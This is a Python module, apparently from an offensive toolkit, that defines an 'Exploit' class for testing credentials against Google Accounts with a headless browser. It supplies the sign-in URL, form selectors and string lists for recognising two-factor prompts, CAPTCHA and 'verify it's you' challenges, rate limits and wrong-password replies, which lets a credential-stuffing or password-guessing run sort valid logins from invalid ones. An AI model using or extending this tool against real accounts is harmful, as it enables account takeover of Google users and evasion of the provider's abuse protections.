"""Google/Gmail Credential Tester — headless-browser login flow.

WARNING: extremely aggressive detection — even 1 failed attempt may trigger
CAPTCHA or a "verify it's you" challenge.
"""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Google/Gmail Credential Tester"
    description = "Tests credentials against Google Accounts via a headless browser. WARNING: Extremely aggressive challenge detection."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "google"
    browser_login_url = "https://accounts.google.com/v3/signin/identifier?continue=https://accounts.google.com&flowName=GlifWebSignIn"
    username_selector = "input[name=identifier]"
    username_submit_selector = "button:has-text('Next')"
    password_selector = "input[name=Passwd]"
    submit_enter = True
    submit_selectors = ("button:has-text('Next')", "button[type=submit]")
    browser_login_paths = ("/signin", "/sign-in", "/v3")
    twofa_markers = (
        "2-step verification", "two-factor", "two factor", "2fa",
        "verification code", "confirm your identity", "authenticator app",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "verify it's you",
        "confirm it's you", "are you a robot", "unusual traffic",
        "couldn't sign you in", "browser or app may not be secure",
        "may not be secure", "try using a different browser",
    )
    rate_markers = (
        "too many attempts", "try again later", "too many failed",
        "please wait a few", "temporarily",
    )
    invalid_markers = (
        "wrong password", "couldn't find your google account", "couldn't find your account",
        "incorrect password", "password is incorrect", "no account with that",
        "invalid password",
    )
